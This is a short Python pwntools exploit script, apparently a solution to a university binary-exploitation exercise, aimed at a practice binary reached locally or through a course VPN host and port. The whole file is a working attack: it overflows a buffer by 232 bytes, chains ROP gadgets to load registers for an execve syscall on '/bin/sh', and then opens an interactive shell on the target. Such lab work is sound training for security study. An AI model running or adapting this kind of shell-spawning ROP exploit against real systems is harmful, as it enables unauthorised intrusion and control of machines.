#!/usr/bin/env python3
from sys import argv
from pwn import *
import vpn_conf
import re

HOST = args.HOST or vpn_conf.HOST
PORT = int(args.PORT or vpn_conf.BASE_PORT + 12)
EXE_FILENAME = '../pwn_student_binaries/rop-test_Federico-Conti'
argv = [EXE_FILENAME]
envp = {}

OFFSET_RIP = 224 + 8  # RBP + RIP ... thanks pwn cyclic :)
POP_RDI = 0x00000000004011bb #pop rdi; ret;
POP_RAX = 0x0000000000401196 # pop rax; ret;
BINNASH = 0x00402051 # /bin/sh 
SYSCALL = 0x00000000004011cd
POP_RSI = 0x00000000004011bd # pop rsi; pop rbx; ret;
POP_RDX = 0x00000000004011b5 # pop rdx; ret;
SYSCALL_EXECVE = 0x3b 

def start():
    gdbscript = '''
    tbreak *__libc_start_main
    '''
    if args.GDB:
        return gdb.debug(args=argv, env=envp, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(EXE_FILENAME)

io = start()

payload  = b"a" * (OFFSET_RIP)  
payload += p64(POP_RAX)
payload += p64(SYSCALL_EXECVE)
payload += p64(POP_RDI) 
payload += p64(BINNASH)
payload += p64(POP_RSI)
payload += p64(0)
payload += p64(0) # align stack for pop rbx;
payload += p64(POP_RDX)
payload += p64(0)
payload += p64(SYSCALL)

io.sendlineafter(b'Enter a number: ', payload)

io.interactive()
